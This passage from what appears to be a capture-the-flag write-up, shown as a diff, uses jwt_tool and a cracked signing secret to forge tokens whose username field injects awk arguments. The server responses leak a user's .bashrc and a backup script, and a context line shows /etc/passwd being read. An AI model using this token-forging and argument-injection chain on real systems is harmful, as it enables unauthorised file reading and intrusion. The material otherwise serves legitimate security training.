@@ -310,3 +310,282 @@ You have a new leave request to review!
 '/ /etc/passwd /',/' /etc/passwd 'a,id,id,Pending
 .
 ```
+
+```console
+└─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+
+====================================================================
+This option allows you to tamper with the header, contents and 
+signature of the JWT.
+====================================================================
+
+Token header values:
+[1] alg = "HS256"
+[2] typ = "JWT"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token payload values:
+[1] username = "christopher.jones"
+[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[5] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 1
+
+Current value of username is: christopher.jones
+Please enter new value and hit ENTER
+> /' /home/bean/.bashrc '/
+[1] username = "/' /home/bean/.bashrc '/"
+[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[5] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+jwttool_385297dc9babe05c25f3eae1c3f4e8bd - Tampered token - HMAC Signing:
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnLyIsImlhdCI6MTY2NjkwNDEwMH0.Us1Hs3HRZnruqhDal7Ppc7tajBW8cI6-2jJLBeWxD4c
+```
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 31 Oct 2022 16:18:48 GMT
+Content-Type: application/octet-stream
+Content-Length: 3847
+Connection: close
+x-powered-by: Express
+access-control-allow-origin: *
+etag: W/"f07-ypE/+rfnER8/a2uax1UKtXq6eaw"
+
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
+    alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+alias ll='ls -alF'
+alias la='ls -A'
+alias l='ls -CF'
+
+# custom
+alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
+
+# Add an "alert" alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+```
+
+
+
+```console
+└─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.6                \______|             @ticarpi      
+
+Original JWT: 
+
+
+====================================================================
+This option allows you to tamper with the header, contents and 
+signature of the JWT.
+====================================================================
+
+Token header values:
+[1] alg = "HS256"
+[2] typ = "JWT"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+
+Token payload values:
+[1] username = "christopher.jones"
+[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[5] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 1
+
+Current value of username is: christopher.jones
+Please enter new value and hit ENTER
+> /' /home/bean/Documents/backup_home.sh '/
+[1] username = "/' /home/bean/Documents/backup_home.sh '/"
+[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[5] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+> 0
+jwttool_add6b83edf43d4c9ac97d032e4226f98 - Tampered token - HMAC Signing:
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICcvIiwiaWF0IjoxNjY2OTA0MTAwfQ.F1hddTOC6QI1RcDOVL-x6-jPPkr8ZI74ELc-qV0hTP8
+```
+
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 31 Oct 2022 16:20:59 GMT
+Content-Type: application/octet-stream
+Content-Length: 369
+Connection: close
+x-powered-by: Express
+access-control-allow-origin: *
+etag: W/"171-tpXrl2gSeqg6oBUojjtuEj25udY"
+
+#!/bin/bash
+mkdir /home/bean/Documents/backup_tmp
+cd /home/bean
+tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
+date > /home/bean/Documents/backup_tmp/time.txt
+cd /home/bean/Documents/backup_tmp
+tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
+rm -r /home/bean/Documents/backup_tmp
+```
